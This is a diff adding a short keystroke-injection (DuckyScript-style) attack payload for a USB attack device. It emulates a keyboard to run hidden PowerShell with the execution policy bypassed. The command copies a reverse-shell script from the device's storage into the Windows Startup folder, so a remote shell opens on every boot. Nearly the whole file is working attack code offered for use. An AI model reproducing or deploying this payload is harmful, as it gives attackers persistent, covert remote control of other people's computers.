@@ -1,0 +1,9 @@
+REM AUTHOR Crashwire
+REM DESCRIPTION This payload operates as a "logic Bomb" attack by placing the reverse-powershell.ps1 payload into the startup folder, triggering reverse shell upon boot-up. 
+REM *require reverse-powershell.ps1 to be stored on D:\ Drive
+ATTACKMODE HID STORAGE
+DELAY 900
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden -ExecutionPolicy Bypass -Command "Copy-Item -Path 'D:\reverse-powershell.ps1' -Destination '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup' -Force"
+ENTER
